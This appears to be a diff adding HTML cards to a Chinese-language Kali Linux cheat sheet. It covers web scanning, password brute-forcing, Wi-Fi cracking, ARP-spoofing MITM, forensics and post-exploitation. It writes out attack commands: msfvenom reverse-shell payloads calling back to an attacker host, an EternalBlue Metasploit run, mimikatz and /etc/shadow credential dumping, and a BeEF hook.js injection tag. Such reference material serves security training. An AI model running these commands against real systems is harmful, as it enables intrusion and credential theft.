+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 默认字典扫描</span>
+$ <span class="c0">dirb</span> http://target.com
+
+<span class="cp"># 自定义字典 + 扩展名</span>
+$ <span class="c0">dirb</span> http://target.com /usr/share/wordlists/dirb/common.txt <span class="c1">-X</span> .php,.asp,.txt
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="wpscan">
+        <div class="cmd-row">
+          <span class="cmd-name">wpscan</span>
+          <span class="cmd-tag tag-web">WordPress</span>
+        </div>
+        <div class="cmd-desc">WordPress 安全扫描器（用户枚举、插件漏洞、弱密码）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">wpscan</span> <span class="c1">--url</span> URL [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 基础扫描</span>
+$ <span class="c0">wpscan</span> <span class="c1">--url</span> http://target.com
+
+<span class="cp"># 枚举用户</span>
+$ <span class="c0">wpscan</span> <span class="c1">--url</span> http://target.com <span class="c1">--enumerate</span> u
+
+<span class="cp"># 爆破密码</span>
+$ <span class="c0">wpscan</span> <span class="c1">--url</span> http://target.com <span class="c1">--passwords</span> /usr/share/wordlists/rockyou.txt
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>WP 站点必备！能查主题/插件版本漏洞。枚举用户后社工 + 爆破。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="ffuf">
+        <div class="cmd-row">
+          <span class="cmd-name">ffuf</span>
+          <span class="cmd-tag tag-web">模糊</span>
+        </div>
+        <div class="cmd-desc">快速 Web 模糊测试工具（目录、参数、子域名）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">ffuf</span> <span class="c1">-u</span> URL <span class="c1">-w</span> 字典</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 目录爆破（FUZZ 是占位符）</span>
+$ <span class="c0">ffuf</span> <span class="c1">-u</span> http://target.com/FUZZ <span class="c1">-w</span> dict.txt
+
+<span class="cp"># 参数模糊测试</span>
+$ <span class="c0">ffuf</span> <span class="c1">-u</span> "http://target.com/?FUZZ=1" <span class="c1">-w</span> params.txt
+
+<span class="cp"># 子域名爆破</span>
+$ <span class="c0">ffuf</span> <span class="c1">-u</span> "https://FUZZ.example.com" <span class="c1">-w</span> subdomains.txt
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>ffuf 比 gobuster 更灵活（可模糊任何位置），速度也更快！<br>用 <strong>-fc 404</strong> 过滤掉返回 404 的结果。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="commix">
+        <div class="cmd-row">
+          <span class="cmd-name">commix</span>
+          <span class="cmd-tag tag-web">命令</span>
+        </div>
+        <div class="cmd-desc">自动化命令注入漏洞检测与利用</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">commix</span> <span class="c1">-u</span> URL [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+$ <span class="c0">commix</span> <span class="c1">-u</span> "http://target.com/page.php?ip=127.0.0.1"
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="xsser">
+        <div class="cmd-row">
+          <span class="cmd-name">xsser</span>
+          <span class="cmd-tag tag-web">XSS</span>
+        </div>
+        <div class="cmd-desc">跨站脚本攻击（XSS）自动化检测与利用</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">xsser</span> <span class="c1">-u</span> URL [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp">#  GET 参数检测</span>
+$ <span class="c0">xsser</span> <span class="c1">-u</span> "http://target.com/page.php?q=test"
+          </div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 密码攻击 ===================== -->
+  <section class="category-section" data-cat="pass">
+    <div class="cat-header">
+      <span style="font-size:22px">🔑</span>
+      <h2 style="color:var(--accent5)">密码攻击</h2>
+      <span class="badge">5 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="hydra">
+        <div class="cmd-row">
+          <span class="cmd-name">hydra</span>
+          <span class="cmd-tag tag-pass">爆破</span>
+        </div>
+        <div class="cmd-desc">在线密码爆破之王 —— 支持 SSH/FTP/HTTP/MySQL 等 50+ 协议</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">hydra</span> <span class="c1">-l</span> 用户 <span class="c1">-P</span> 字典 目标 协议</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># SSH 爆破</span>
+$ <span class="c0">hydra</span> <span class="c1">-l</span> root <span class="c1">-P</span> /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
+
+<span class="cp"># 用户列表 + 密码列表</span>
+$ <span class="c0">hydra</span> <span class="c1">-L</span> users.txt <span class="c1">-P</span> pass.txt ftp://192.168.1.100
+
+<span class="cp"># HTTP POST 表单爆破</span>
+$ <span class="c0">hydra</span> <span class="c1">-l</span> admin <span class="c1">-P</span> pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
+
+<span class="cp"># 指定线程数</span>
+$ <span class="c0">hydra</span> <span class="c1">-l</span> root <span class="c1">-P</span> pass.txt <span class="c1">-t</span> 4 192.168.1.100 ssh
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 自带字典 <strong>/usr/share/wordlists/rockyou.txt.gz</strong>，先解压：<br><strong>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</strong></span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="john">
+        <div class="cmd-row">
+          <span class="cmd-name">john</span>
+          <span class="cmd-tag tag-pass">离线</span>
+        </div>
+        <div class="cmd-desc">John the Ripper —— 离线密码破解（哈希破解）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">john</span> [选项] 哈希文件</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 破解 shadow 文件</span>
+$ <span class="c0">sudo unshadow</span> /etc/passwd /etc/shadow &gt; hashes.txt
+$ <span class="c0">john</span> hashes.txt
+
+<span class="cp"># 指定字典</span>
+$ <span class="c0">john</span> <span class="c1">--wordlist=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+
+<span class="cp"># 显示已破解的密码</span>
+$ <span class="c0">john</span> <span class="c1">--show</span> hashes.txt
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>取到 /etc/shadow 后第一件事：<strong>unshadow</strong> 然后 <strong>john</strong>！<br>GPU 加速版 <strong>hashcat</strong> 更快，但 john 更方便。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="hashcat">
+        <div class="cmd-row">
+          <span class="cmd-name">hashcat</span>
+          <span class="cmd-tag tag-pass">GPU</span>
+        </div>
+        <div class="cmd-desc">世界上最快的密码恢复工具（GPU 加速）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">hashcat</span> <span class="c1">-m</span> 模式 <span class="c1">-a</span> 攻击方式 哈希 字典</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 破解 MD5（-m 0）字典攻击（-a 0）</span>
+$ <span class="c0">hashcat</span> <span class="c1">-m</span> 0 <span class="c1">-a</span> 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cp"># 常用模式</span>
+<span class="c2">-m 0</span>    MD5
+<span class="c2">-m 1000</span> NTLM（Windows）
+<span class="c2">-m 3200</span> bcrypt（慢）
+<span class="c2">-m 1800</span> sha512crypt（Linux shadow）
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>hashcat 需要 GPU（Kali VM 默认没有），但 CPU 也能跑只是慢。<br><strong>hashcat --example-hashes</strong> 查看所有模式的哈希样例。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="crunch">
+        <div class="cmd-row">
+          <span class="cmd-name">crunch</span>
+          <span class="cmd-tag tag-pass">字典</span>
+        </div>
+        <div class="cmd-desc">生成自定义密码字典</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">crunch</span> 最小长度 最大长度 [字符集] [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 生成长度 6-8 的数字密码</span>
+$ <span class="c0">crunch</span> 6 8 0123456789 <span class="c1">-o</span> num.txt
+
+<span class="cp"># 生成 admin 开头的密码</span>
+$ <span class="c0">crunch</span> 8 10 <span class="c1">-t</span> admin%%%
+          </div>
+          <div class="tip-box"><span class="ti">⚠️</span><span>文件会非常大！6 位数字 100 万条 ≈ 8MB，8 位字母数字 ≈ 200TB+！</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="cewl">
+        <div class="cmd-row">
+          <span class="cmd-name">cewl</span>
+          <span class="cmd-tag tag-pass">爬取</span>
+        </div>
+        <div class="cmd-desc">从网站爬取关键词生成自定义字典</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">cewl</span> <span class="c1">-w</span> 输出 URL</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 爬取目标网站生成密码字典</span>
+$ <span class="c0">cewl</span> <span class="c1">-w</span> target_words.txt https://target.com
+
+<span class="cp"># 指定爬取深度</span>
+$ <span class="c0">cewl</span> <span class="c1">-d</span> 3 <span class="c1">-m</span> 6 <span class="c1">-w</span> dict.txt https://target.com
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>社工必备！从目标公司网站爬取的词（人名、产品名）命中率极高。</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 无线网络 ===================== -->
+  <section class="category-section" data-cat="wifi">
+    <div class="cat-header">
+      <span style="font-size:22px">📡</span>
+      <h2 style="color:var(--accent4)">无线网络</h2>
+      <span class="badge">4 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="aircrack-ng">
+        <div class="cmd-row">
+          <span class="cmd-name">aircrack-ng</span>
+          <span class="cmd-tag tag-wifi">Wi-Fi</span>
+        </div>
+        <div class="cmd-desc">Wi-Fi 安全审计工具套装（抓包、破解 WPA/WPA2）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 流程</div>
+          <div class="code-block">
+<span class="cp"># 1. 开启监听模式</span>
+$ <span class="c0">sudo airmon-ng start wlan0</span>
+
+<span class="cp"># 2. 扫描附近网络</span>
+$ <span class="c0">sudo airodump-ng wlan0mon</span>
+
+<span class="cp"># 3. 锁定目标抓包</span>
+$ <span class="c0">sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon</span>
+
+<span class="cp"># 4. 解认证攻击（抓握手包）</span>
+$ <span class="c0">sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon</span>
+
+<span class="cp"># 5. 破解</span>
+$ <span class="c0">aircrack-ng -w</span> /usr/share/wordlists/rockyou.txt capture-01.cap
+          </div>
+          <div class="tip-box"><span class="ti">⚠️</span><span>Wi-Fi 审计需要支持监听模式的外置网卡（如 Alfa AWUS036ACH）。<br>虚拟机里通常无效，必须物理机 + 外置网卡。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="reaver">
+        <div class="cmd-row">
+          <span class="cmd-name">reaver</span>
+          <span class="cmd-tag tag-wifi">WPS</span>
+        </div>
+        <div class="cmd-desc">WPS PIN 码暴力破解（WPA/WPA2 弱 PIN）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">sudo reaver</span> <span class="c1">-i</span> 接口 <span class="c1">-b</span> BSSID <span class="c1">-vv</span></div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+$ <span class="c0">sudo reaver -i wlan0mon -b</span> XX:XX:XX:XX:XX:XX <span class="c1">-vv</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>现代路由器大多已禁用 WPS 或加了锁频保护。<br>不成功是常态 —— 不是所有路由器都脆弱。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="kismet">
+        <div class="cmd-row">
+          <span class="cmd-name">kismet</span>
+          <span class="cmd-tag tag-wifi">探测</span>
+        </div>
+        <div class="cmd-desc">无线网络探测、抓包、入侵检测系统</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 启动</div>
+          <div class="code-block">
+$ <span class="c0">sudo kismet</span>
+<span class="cm"># 启动后浏览器访问 http://127.0.0.1:2501</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>kismet 可以被动收集所有附近的 Wi-Fi 信号、蓝牙设备，还能检测到隐藏 SSID！</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="wifite">
+        <div class="cmd-row">
+          <span class="cmd-name">wifite</span>
+          <span class="cmd-tag tag-wifi">一键</span>
+        </div>
+        <div class="cmd-desc">自动化 Wi-Fi 审计脚本（封装 aircrack-ng）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 一键扫描 + 自动选择目标 + 抓握手包 + 破解</span>
+$ <span class="c0">sudo wifite</span>
+
+<span class="cp"># 只破解 WPA 网络</span>
+$ <span class="c0">sudo wifite --wpa</span>
+
+<span class="cp"># 指定字典</span>
+$ <span class="c0">sudo wifite --dict</span> /usr/share/wordlists/rockyou.txt
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>懒人神器！一条命令全程自动化，适合 Wi-Fi 安全自检。</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 嗅探/欺骗 ===================== -->
+  <section class="category-section" data-cat="snif">
+    <div class="cat-header">
+      <span style="font-size:22px">👃</span>
+      <h2 style="color:var(--accent2)">嗅探 / 欺骗</h2>
+      <span class="badge">5 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="wireshark">
+        <div class="cmd-row">
+          <span class="cmd-name">wireshark</span>
+          <span class="cmd-tag tag-snif">抓包</span>
+        </div>
+        <div class="cmd-desc">图形化网络协议分析器（抓包神器）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 启动（需要有 root 或 wireshark 组权限）</span>
+$ <span class="c0">sudo wireshark</span>
+
+<span class="cm"># 常用过滤表达式</span>
+<span class="c2">http</span>             只看 HTTP 请求
+<span class="c2">ip.addr == 1.2.3.4</span>  过滤 IP
+<span class="c2">tcp.port == 80</span>    过滤端口
+<span class="c2">http.request</span>     只显示 HTTP 请求
+<span class="c2">frame contains "admin"</span>  搜索包内容
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 里预装。<strong>tshark</strong> 是 Wireshark 的命令行版，适合脚本自动化。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="tcpdump">
+        <div class="cmd-row">
+          <span class="cmd-name">tcpdump</span>
+          <span class="cmd-tag tag-snif">CLI</span>
+        </div>
+        <div class="cmd-desc">命令行网络抓包分析工具</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">sudo tcpdump</span> [选项] [表达式]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 监听所有流量</span>
+$ <span class="c0">sudo tcpdump</span> <span class="c1">-i</span> eth0
+
+<span class="cp"># 只看 HTTP 流量</span>
+$ <span class="c0">sudo tcpdump</span> <span class="c1">-i</span> eth0 port 80
+
+<span class="cp"># 保存到 pcap 文件</span>
+$ <span class="c0">sudo tcpdump</span> <span class="c1">-i</span> eth0 <span class="c1">-w</span> capture.pcap
+
+<span class="cp"># 读取 pcap 文件</span>
+$ <span class="c0">sudo tcpdump</span> <span class="c1">-r</span> capture.pcap
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span><strong>tcpdump port 80 -X</strong> 以十六进制+ASCII 显示包内容，能看到明文 HTTP！</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="bettercap">
+        <div class="cmd-row">
+          <span class="cmd-name">bettercap</span>
+          <span class="cmd-tag tag-snif">MITM</span>
+        </div>
+        <div class="cmd-desc">功能强大的中间人攻击框架（MITM、DNS 欺骗、嗅探）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 交互式启动</span>
+$ <span class="c0">sudo bettercap</span>
+
+<span class="cp"># 网络嗅探模式</span>
+net.probe on
+net.sniff on
+
+<span class="cp"># ARP 欺骗局域网所有主机</span>
+arp.spoof on
+
+<span class="cp"># 非交互式：HTTP 凭证嗅探</span>
+$ <span class="c0">sudo bettercap -eval</span> "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>bettercap 是 kali 里的新 MITM 神器，比 ettercap 更现代、功能更全！<br>支持 HTTP/HTTPS/DNS 劫持、凭据捕获、实时模块加载。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="ettercap">
+        <div class="cmd-row">
+          <span class="cmd-name">ettercap</span>
+          <span class="cmd-tag tag-snif">MITM</span>
+        </div>
+        <div class="cmd-desc">经典的 ARP 欺骗 + 中间人攻击工具</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block">
+<span class="cp"># 图形界面</span>
+$ <span class="c0">sudo ettercap -G</span>
+
+<span class="cp"># 命令行 ARP 欺骗</span>
+$ <span class="c0">sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>ettercap 是经典老牌工具，bettercap 是它的现代替代品。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="responder">
+        <div class="cmd-row">
+          <span class="cmd-name">responder</span>
+          <span class="cmd-tag tag-snif">LLMNR</span>
+        </div>
+        <div class="cmd-desc">LLMNR/NBT-NS/mDNS 欺骗 —— 捕获 Windows 网络凭据</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">sudo responder</span> <span class="c1">-I</span> 接口 [选项]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 监听 eth0，捕获所有哈希</span>
+$ <span class="c0">sudo responder -I eth0 -wdv</span>
+
+<span class="cp"># -w：启动 WPAD 代理    -d：DHCP    -v：详细输出</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Windows 内网渗透神器！等待用户输入凭据，responder 就能抓到 NetNTLM 哈希。</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 后渗透 ===================== -->
+  <section class="category-section" data-cat="post">
+    <div class="cat-header">
+      <span style="font-size:22px">💉</span>
+      <h2 style="color:var(--accent)">后渗透</h2>
+      <span class="badge">5 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="metasploit">
+        <div class="cmd-row">
+          <span class="cmd-name">msfconsole</span>
+          <span class="cmd-tag tag-post">利用</span>
+        </div>
+        <div class="cmd-desc">Metasploit 框架 —— 漏洞利用、后渗透、Payload 生成</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 启动</span>
+$ <span class="c0">msfconsole</span>
+
+<span class="cm">msf6&gt; </span><span class="c2">search eternalblue</span>               <span class="cm"># 搜索漏洞</span>
+<span class="cm">msf6&gt; </span><span class="c2">use exploit/windows/smb/ms17_010</span> <span class="cm"># 使用模块</span>
+<span class="cm">msf6&gt; </span><span class="c2">show options</span>                     <span class="cm"># 查看配置</span>
+<span class="cm">msf6&gt; </span><span class="c2">set RHOSTS 192.168.1.100</span>          <span class="cm"># 设置目标</span>
+<span class="cm">msf6&gt; </span><span class="c2">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="cm">msf6&gt; </span><span class="c2">set LHOST 192.168.1.10</span>
+<span class="cm">msf6&gt; </span><span class="c2">exploit</span>
+
+<span class="cm">meterpreter&gt; sysinfo        # 查看系统信息</span>
+<span class="cm">meterpreter&gt; getuid         # 查看当前权限</span>
+<span class="cm">meterpreter&gt; shell          # 进入系统 shell</span>
+<span class="cm">meterpreter&gt; screenshot     # 截屏</span>
+<span class="cm">meterpreter&gt> download file # 下载文件</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Metasploit = 渗透界的瑞士军刀。Kali 预装，<strong>msfupdate</strong> 更新模块库。<br><strong>msfvenom</strong> 生成自定义 payload（如 Windows 木马）。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="msfvenom">
+        <div class="cmd-row">
+          <span class="cmd-name">msfvenom</span>
+          <span class="cmd-tag tag-post">Payload</span>
+        </div>
+        <div class="cmd-desc">生成自定义 Payload（木马 / Shellcode / 免杀）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">msfvenom</span> <span class="c1">-p</span> payload <span class="c1">LHOST=</span>IP <span class="c1">LPORT=</span>端口 <span class="c1">-f</span> 格式 <span class="c1">-o</span> 输出</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># Windows 反向连接木马</span>
+$ <span class="c0">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
+
+<span class="cp"># Linux ELF</span>
+$ <span class="c0">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf
+
+<span class="cp"># Python shellcode</span>
+$ <span class="c0">msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f python
+
+<span class="cp"># 列出所有 payloads</span>
+$ <span class="c0">msfvenom -l payloads</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="powershell_empire">
+        <div class="cmd-row">
+          <span class="cmd-name">powershell-empire</span>
+          <span class="cmd-tag tag-post">Powershell</span>
+        </div>
+        <div class="cmd-desc">基于 PowerShell 的后渗透框架</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 启动</div>
+          <div class="code-block">
+<span class="cp"># 启动服务端</span>
+$ <span class="c0">sudo powershell-empire server</span>
+
+<span class="cp"># 新终端启动客户端</span>
+$ <span class="c0">sudo powershell-empire client</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>纯 PowerShell 实现，无需落地文件！配合 Cobalt Strike 是红队标配。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="mimikatz">
+        <div class="cmd-row">
+          <span class="cmd-name">mimikatz</span>
+          <span class="cmd-tag tag-post">凭据</span>
+        </div>
+        <div class="cmd-desc">Windows 凭据提取（抓明文密码 / 哈希 / Kerberos 票据）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cm"># 在 Windows 目标上运行（通过 meterpreter 上传或直接执行）</span>
+
+mimikatz # <span class="c2">privilege::debug</span>    <span class="cm"># 获取调试权限</span>
+mimikatz # <span class="c2">sekurlsa::logonpasswords</span>  <span class="cm"># 抓登录密码</span>
+mimikatz # <span class="c2">lsadump::sam</span>             <span class="cm"># 抓 SAM 哈希</span>
+mimikatz # <span class="c2">kerberos::list</span>           <span class="cm"># 列出 Kerberos 票据</span>
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>Kali 里自带 mimikatz，打包在 <strong>/usr/share/mimikatz/</strong> 或通过 wine 运行。<br><strong>kiwi</strong> 是 meterpreter 内置的 mimikatz 版本。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="beef">
+        <div class="cmd-row">
+          <span class="cmd-name">beef</span>
+          <span class="cmd-tag tag-post">浏览器</span>
+        </div>
+        <div class="cmd-desc">浏览器利用框架（BeEF）—— 控制目标浏览器</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 使用</div>
+          <div class="code-block">
+<span class="cp"># 启动 BeEF</span>
+$ <span class="c0">sudo beef-xss</span>
+
+<span class="cm"># 访问管理面板（Kali 默认）</span>
+URL:  http://127.0.0.1:3000/ui/panel
+默认用户: beef  默认密码: beef
+
+<span class="cm"># 把 hook.js 植入目标页面即可控制浏览器</span>
+&lt;script src="http://你的IP:3000/hook.js"&gt;&lt;/script&gt;
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>一旦目标浏览器加载了 hook.js —— 你可以截获击键、窃取 Cookie、截屏、探测内网！</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ===================== 数字取证 ===================== -->
+  <section class="category-section" data-cat="fore">
+    <div class="cat-header">
+      <span style="font-size:22px">🔬</span>
+      <h2 style="color:var(--accent4)">数字取证</h2>
+      <span class="badge">5 条</span>
+    </div>
+    <div class="cmd-grid">
+
+      <article class="cmd-card" data-command="foremost">
+        <div class="cmd-row">
+          <span class="cmd-name">foremost</span>
+          <span class="cmd-tag tag-fore">恢复</span>
+        </div>
+        <div class="cmd-desc">文件恢复工具 —— 根据文件头恢复被删除的数据</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">foremost</span> <span class="c1">-i</span> 磁盘镜像 <span class="c1">-o</span> 输出目录</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 从镜像恢复所有可能的文件</span>
+$ <span class="c0">foremost -i</span> disk.dd <span class="c1">-o</span> output/
+
+<span class="cp"># 只恢复 jpg 和 png</span>
+$ <span class="c0">foremost -t</span> jpg,png <span class="c1">-i</span> image.dd <span class="c1">-o</span> recovered/
+          </div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="binwalk">
+        <div class="cmd-row">
+          <span class="cmd-name">binwalk</span>
+          <span class="cmd-tag tag-fore">固件</span>
+        </div>
+        <div class="cmd-desc">固件分析 —— 提取嵌入的文件系统、分析二进制</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">binwalk</span> [选项] 文件</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 扫描嵌入的文件</span>
+$ <span class="c0">binwalk</span> firmware.bin
+
+<span class="cp"># 提取所有内容</span>
+$ <span class="c0">binwalk -e</span> firmware.bin
+
+<span class="cp"># 递归提取（针对多层打包）</span>
+$ <span class="c0">binwalk -Me</span> firmware.bin
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>IOT 安全分析必备！从固件里提取文件系统（squashfs / ubifs）做进一步分析。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="strings">
+        <div class="cmd-row">
+          <span class="cmd-name">strings</span>
+          <span class="cmd-tag tag-fore">字符串</span>
+        </div>
+        <div class="cmd-desc">从二进制文件中提取可打印字符串</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">strings</span> [选项] 文件</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 提取所有字符串</span>
+$ <span class="c0">strings</span> suspicious.exe
+
+<span class="cp"># 搜索特定内容（如 URL、密码）</span>
+$ <span class="c0">strings</span> malware.bin | grep -i "http"
+
+<span class="cp"># 设置最小长度</span>
+$ <span class="c0">strings -n 10</span> binary.elf
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>最简单的逆向手段！经常能从恶意软件里找到 C2 地址、配置信息、硬编码密码。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="volatility">
+        <div class="cmd-row">
+          <span class="cmd-name">volatility</span>
+          <span class="cmd-tag tag-fore">内存</span>
+        </div>
+        <div class="cmd-desc">内存取证分析框架（分析 RAM 镜像）</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 语法</div>
+          <div class="code-block"><span class="c0">volatility -f</span> 镜像.dmp <span class="c1">--profile=</span>系统版本 [插件]</div>
+          <div class="detail-label">💡 示例</div>
+          <div class="code-block">
+<span class="cp"># 查看进程列表</span>
+$ <span class="c0">volatility -f</span> mem.dmp <span class="c1">--profile=</span>Win10x64 pslist
+
+<span class="cp"># 查看网络连接</span>
+$ <span class="c0">volatility -f</span> mem.dmp <span class="c1">--profile=</span>Win10x64 netscan
+
+<span class="cp"># 查看命令行历史</span>
+$ <span class="c0">volatility -f</span> mem.dmp <span class="c1">--profile=</span>Win10x64 cmdline
+
+<span class="cp"># 提取密码哈希</span>
+$ <span class="c0">volatility -f</span> mem.dmp <span class="c1">--profile=</span>Win10x64 hashdump
+          </div>
+          <div class="tip-box"><span class="ti">💡</span><span>取到内存 dump 后，volatility 可以还原正在运行的进程、网络连接、密码等！<br>Kali 2024+ 用 <strong>volatility3</strong>（不用 --profile 了）。</span></div>
+        </div>
+      </article>
+
+      <article class="cmd-card" data-command="sleuthkit">
+        <div class="cmd-row">
+          <span class="cmd-name">sleuthkit (fls/icat)</span>
+          <span class="cmd-tag tag-fore">磁盘</span>
+        </div>
+        <div class="cmd-desc">磁盘取证工具集 —— 分析文件系统、恢复删除文件</div>
+        <div class="cmd-detail">
+          <div class="detail-label">📖 常用工具</div>
+          <div class="code-block">
+<span class="c2">fls</span>        列出已删除的文件
+<span class="c2">icat</span>       按 inode 读取文件内容
+<span class="c2">mmls</span>       查看分区表
+<span class="c2">fsstat</span>     查看文件系统详细信息
+          </div>
+          <div class="detail-label">💡 示例</div>
